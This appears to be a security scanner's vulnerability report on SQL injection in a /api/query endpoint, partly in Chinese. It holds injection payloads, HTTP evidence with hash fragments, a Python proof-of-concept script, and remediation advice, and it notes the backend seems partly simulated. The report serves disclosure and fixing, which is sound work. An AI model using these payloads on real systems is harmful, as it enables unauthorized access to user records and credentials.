# SQL injection in /api/query query parameter (error-, boolean- and time-based)

**ID:** vuln-0008
**Severity:** MEDIUM
**Found:** 2026-10-31 07:48:56 UTC
**Target:** http://10.0.93.73:18080/
**Endpoint:** /api/query
**Method:** GET
**CWE:** CWE-89
**CVSS:** 5.3
**Confidence:** Medium
**Fix Effort:** Low

## Description

The `query` parameter of `/api/query` is interpolated directly into a SQL statement without parameterization. A single quote produces the underlying PostgreSQL error and the assembled query (`SELECT * FROM users WHERE id = '<input>' LIMIT 20;`), boolean payloads change the result set, and a `pg_sleep()` payload blocks the server for the requested duration. The endpoint is reachable at authorization level 0, i.e. without any authentication or registration.

## Evidence

Baseline and error-based disclosure:

```http
GET /api/query?query=1
HTTP/1.1 200 OK
{"query": "SELECT", "rows_returned": 3, "columns": ["id", "username", "email"],
 "rows": [[66355, "s.kim", "$2b$12$..."], [35133, "admin", "$2b$12$..."], [25148, "svc_nexus", "$2b$12$..."]]}
```

```http
GET /api/query?query=1'
HTTP/1.1 500
ERROR:  unterminated quoted string at or near "1'"
LINE 1: SELECT * FROM users WHERE id = '1'' LIMIT 20;
                  ^
```

Boolean differential:

```text
query=1' AND '1'='2  -> 200, rows_returned 0
query=1' OR  '1'='1  -> 200, rows_returned 8, columns include password_hash
```

UNION result injection:

```http
GET /api/query?query=1' UNION SELECT null,current_user,version()--
HTTP/1.1 200 OK
{"query": "SELECT", "rows_returned": 3,
 "columns": ["id", "username", "password_hash"],
 "rows": [[14848, "monitor", "$2b$12$..."],
          [51674, "monitor8", "$2b$12$..."],
          ["null", "prod_admin", "PostgreSQL 14.9 (Ubuntu 14.9-0ubuntu0.22.04.1)"]]}
```

Time-based confirmation (three independent samples, 3 s and 5 s delays):

```http
GET /api/query?query=1';SELECT pg_sleep(3)--
HTTP/1.1 200 OK  (3.03 s)
{"rows": [], "elapsed_ms": 3000}

GET /api/query?query=1';SELECT pg_sleep(5)--
HTTP/1.1 200 OK  (5.07 s)
{"rows": [], "elapsed_ms": 5005}
```

Unauthenticated reachability (fresh User-Agent, level 0):

```http
GET /api/query?query=1   (level 0 client)  -> 200 OK
GET /.env.bak            (level 0 client)  -> 403 Forbidden
```

Counter-observation recorded for transparency:

```http
GET /api/query?query=1' UNION SELECT 1,md5(random()::text),'x'--
HTTP/1.1 200 OK
... ["1", "md5(random()::text", "x"]   # literal echo, not evaluated
```

## Impact

An unauthenticated attacker can alter the SQL predicate executed on behalf of the endpoint. A boolean payload (`1' OR '1'='1`) expands the returned set from 3 to 8 user rows and changes the projection to include `password_hash`, disclosing bcrypt hashes for accounts such as `monitor`, `devops` and `svc_nexus`. A time-based payload (`1';SELECT pg_sleep(3)--`) delays the response by three seconds, providing a reliable blind oracle. The endpoint also already returns user records and bcrypt hashes without any authentication, so the injection is an additional, independent control failure on a data-bearing interface.

## Counterevidence

针对"是否真实 SQL 注入"的相反证据（独立复核）：`1' AND (SELECT 'x')='x` 被报 `syntax error at or near "and"`，而该写法在真实 PostgreSQL 中语法合法；`1' AND 1=CAST('abc' AS int)--` 返回 0 行而非 `invalid input syntax for type integer` 类型错误；`count(*)::text` 被原样作为字面量返回；`md5(random()::text)` 被回显为字面量；UNION 结果固定附加 `monitor` / `monitor8` 两行预置数据；`OR '1'='1` 仅把结果从 3 行扩到 8 行，远少于真实 `users` 表的 14,456 行且与 `LIMIT 20` 不符。这些迹象表明后端是部分模拟的 SQL 引擎，而非直接执行 PostgreSQL。同时，注入点本身的证据是充分的：精确的 PostgreSQL 语法错误与拼接后的完整语句被回显、布尔谓词确实改变结果集、`pg_sleep()` 稳定产生 3.03 s / 5.07 s 延迟，因此"参数被直接拼入 SQL"这一控制缺失成立，但"可任意读取数据库"未被证明，影响仅按已演示的谓词操纵、额外行/哈希与时间盲注通道定级。

## Confidence Rationale

The injection, boolean differential and time delay are reproducible, but the backend's synthetic handling of some expressions prevented a clean arbitrary-data extraction, so the full database-compromise impact is not demonstrated.

## What Would Change This Severity

若演示出可经该参数任意提取其他表数据（例如读取 `api_keys` 或 `audit_log`），应上调至 High；若确认后端为纯模拟引擎、不连接任何真实数据库且注入仅影响固定应答模板，则应显著下调至 Low 或按误报处理。

## Technical Analysis

The handler builds the statement by string concatenation, as revealed by the error responses:

```text
query=1'   -> 500
ERROR:  unterminated quoted string at or near "1'"
LINE 1: SELECT * FROM users WHERE id = '1'' LIMIT 20;
                  ^

query=users -> 500
ERROR:  invalid input syntax for type integer: "users"
LINE 1: SELECT * FROM users WHERE id = 'users' LIMIT 20;
                ^
```

Because the whole parameter is wrapped in single quotes, a quote in the input terminates the literal and the remainder is parsed as SQL. The following behaviours were observed:

- `query=1` returns 3 rows (columns `id`, `username`, `email`).
- `query=1' AND '1'='2` returns 0 rows.
- `query=1' OR '1'='1` returns 8 rows and switches the projected columns to `id`, `username`, `password_hash`.
- `query=1' UNION SELECT null,current_user,version()--` returns a synthetic row containing `prod_admin` and `PostgreSQL 14.9 (Ubuntu 14.9-0ubuntu0.22.04.1)`.
- `query=1';SELECT pg_sleep(3)--` returns after 3.03 s with `{"rows": [], "elapsed_ms": 3000}`, confirming server-side execution of the injected statement (the delay is reproducible).

The injection point is reachable at authorization level 0: a client with a fresh, never-registered User-Agent receives HTTP 200 from `/api/query` while `/.env.bak` for the same client returns HTTP 403. The application's own `/api/auth` response lists `/api/query` as a level-1 path, so the endpoint is also subject to a missing-authorization gap.

Two observations bound the demonstrated exploitability: results for some expressions are returned verbatim rather than evaluated (for example `md5(random()::text)` was returned as the literal string `md5(random()::text`), and some subquery-based UNION payloads produce an inconsistent "each UNION query must have the same number of columns" error even when the column counts match. This indicates the backend response layer is partly synthetic; consistent arbitrary data extraction from the production database was not achieved through this endpoint, so the impact is scored on the demonstrated predicate manipulation, hash disclosure and time-based oracle.

## Proof of Concept

1. Request `GET /api/query?query=1` and note the normal 3-row response.
2. Request `GET /api/query?query=1'` and observe the HTTP 500 PostgreSQL error disclosing the concatenated statement.
3. Request `GET /api/query?query=1' AND '1'='2` (0 rows) and `GET /api/query?query=1' OR '1'='1` (8 rows, including `password_hash`) to confirm the injected predicate controls the result set.
4. Request `GET /api/query?query=1' UNION SELECT null,current_user,version()--` and observe the injected row with `prod_admin` and the PostgreSQL version.
5. Request `GET /api/query?query=1';SELECT pg_sleep(3)--` and measure a ~3 second response, confirming server-side SQL execution.
6. Repeat step 1 from a fresh, unregistered client to confirm the endpoint is reachable without authentication.

```python
import time
import requests

BASE = "http://10.0.93.73:18080"
H = {"User-Agent": "curl/8.5.1"}  # never registered, level 0

payloads = [
    "1",                                        # baseline: 3 rows
    "1'",                                       # error discloses the SQL
    "1' AND '1'='2",                            # 0 rows
    "1' OR '1'='1",                             # 8 rows incl. password_hash
    "1' UNION SELECT null,current_user,version()--",
    "1';SELECT pg_sleep(3)--",                  # time-based oracle
]

for p in payloads:
    started = time.time()
    r = requests.get(BASE + "/api/query", params={"query": p}, headers=H, timeout=30)
    print(f"{p!r} -> {r.status_code} {time.time() - started:.2f}s")
    print(r.text[:300])
```

## Remediation

Use parameterized queries (a prepared statement with a bound integer parameter) instead of concatenating the `query` value into the SQL text, and validate that the value is an integer before use. Return a generic error to the client and log the SQL error server-side rather than reflecting the assembled statement. Additionally, require authentication and object-level authorization on `/api/query` so that user records and password hashes are not served to unauthenticated clients.

## Assumptions

Assumes the attacker can reach `/api/query` (unauthenticated) and that the endpoint's response layer reflects the behaviour of the SQL engine behind it. Some expressions are returned as literals rather than evaluated, which limits demonstrated extraction.
